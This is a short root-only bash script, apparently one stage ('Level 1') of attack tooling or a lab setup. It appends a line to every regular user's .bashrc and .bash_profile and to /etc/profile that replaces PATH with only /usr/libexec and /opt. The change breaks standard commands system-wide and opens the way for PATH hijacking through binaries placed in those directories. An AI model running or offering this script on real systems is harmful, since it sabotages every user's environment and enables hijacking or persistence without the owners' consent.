#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "Error: High-privilege access required. Execute with sudo." >&2
  exit 1
fi

TARGET_USERS=$(awk -F: '$3 >= 1000 && $3 != 65534 {print $6}' /etc/passwd)
for user_dir in $TARGET_USERS; do
  if [ -d "$user_dir" ]; then
    echo 'export PATH="/usr/libexec:/opt"' >>"$user_dir/.bashrc"
    echo 'export PATH="/usr/libexec:/opt"' >>"$user_dir/.bash_profile"
    chown $(basename "$user_dir"): "$user_dir/.bashrc" "$user_dir/.bash_profile" 2>/dev/null
  fi
done

echo 'export PATH="/usr/libexec:/opt"' >>/etc/profile
export PATH="/usr/libexec:/opt"
echo "[+] Level 1 complete. Environment path vector modified."
